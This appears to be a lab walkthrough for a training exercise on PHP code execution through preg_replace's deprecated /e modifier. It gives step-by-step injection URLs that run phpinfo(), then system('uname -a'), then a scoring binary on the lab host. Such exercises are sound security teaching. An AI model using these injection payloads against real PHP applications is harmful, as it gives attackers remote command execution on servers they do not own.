Code Execution 03

We talked earlier about regular expression modifiers with multi-line regular expression. Another very dangerous modifier exists in PHP: PCRE_REPLACE_EVAL (/e). This modifier will cause the function preg_replace to evaluate the new value as PHP code, before performing the substitution.

* PCRE_REPLACE_EVAL has been deprecated as of PHP 5.5.0 

Here, you will need to change the pattern, by adding the /e modifier. Once you have added this modifier, you should get a notice:

Notice: Use of undefined constant hacker - assumed 'hacker' in /var/www/codeexec/example3.php(3) : regexp code on line 1

The function preg_replace tries to evaluate the value hacker as a constant but it's not defined, and you get this message.

You can easily replace hacker with a call to the function phpinfo() to get a visible result. Once you can see the result of the phpinfo function, you can use the function system to run any command.

You can access this exercise using the following URL: http://ptc-cc7c7d9f-5271eb84.libcurl.so/. You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-cc7c7d9f-5271eb84.libcurl.so/.

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:

/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8


Common Mistakes:

    * Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

Steps: 
    1) Visit the given url: http://ptc-cc7c7d9f-5271eb84.libcurl.so/
    2) Here we have simple web application that has a message, a pattern and a new parameter.
        It seems as: http://ptc-cc7c7d9f-5271eb84.libcurl.so/?new=hacker&pattern=/lamer/&base=Hello lamer
    3) Let's replace the pattern 'hacker' with phpinfo(). Then when we replace the string if it matches, evaluate the new string. 
        Basically run the eval function to the result. And just a flag 'e' add the regular expression.
       It seems as:  https://ptl-cc7c7d9f-5271eb84.libcurl.so/?new=phpinfo()&pattern=/lamer/e&base=Hello lamer
        Now we learn how to run php info/ access php info of this page.
    4) Just as phpinfo we can also use system. For that we have to change the parameter replacing phpinfo with uname -a.
        It seems as: https://ptl-cc7c7d9f-5271eb84.libcurl.so/?new=system('uname -a')&pattern=/lamer/e&base=Hello lamer
    5) Let's replace the command by (/usr/local/bin/score) with our UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8). 
        It seems as: https://ptl-cc7c7d9f-5271eb84.libcurl.so/?new=system('/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8')&pattern=/lamer/e&base=Hello lamer
    6) Bravo! Exercise completed!! Hello 

    Happy Hacking!! :) 

